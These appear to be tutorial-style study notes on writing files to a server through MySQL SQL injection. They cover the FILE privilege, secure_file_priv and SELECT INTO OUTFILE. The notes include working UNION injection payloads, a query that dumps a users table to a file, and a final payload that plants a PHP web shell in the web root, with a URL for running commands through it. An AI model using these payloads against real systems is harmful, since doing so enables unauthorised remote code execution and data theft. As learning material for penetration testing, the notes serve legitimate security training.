Writing files is very restricted in modern DBMSes, it is disabled by default and requires certain privileges for DBAs to write files.

## Write File Privileges

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled (see [[Reading Files]])
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

### secure_file_priv

If the secure_file_priv variable is set to NULL we don't have permission to read file from an location, if we have a folder in this value, we can only read from that folder (default in MySQL is `/var/lib/mysql-files`), if this value is empty (default in MariaDB) we have permission to read all files.

Query to obtain the value of this variable:
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

In MySQL global variables are stored in the table global_variables in INFORMATION_SCHEMA.

The UNION query:
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

## SELECT INTO OUTFILE

The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) is used to write data from select queries into files.

An example to save the output of a table into a file:
```shell-session
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

We can also directly select strings:
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

The files will be owned by `mysql` user.

Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

## Writing Files Through SQL Injection

We can try writing data into a file using UNION, we can use "" instead of numbers to make the output cleaner:
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

Than we can go to the webroot and add `/proof.txt` to check for that file.

**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

## Writing a Web Shell

Write a basic PHP shell to execute commands to the web root:
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

Execute a command:
```url
http://SERVER_IP:PORT/shell.php?0=id
```

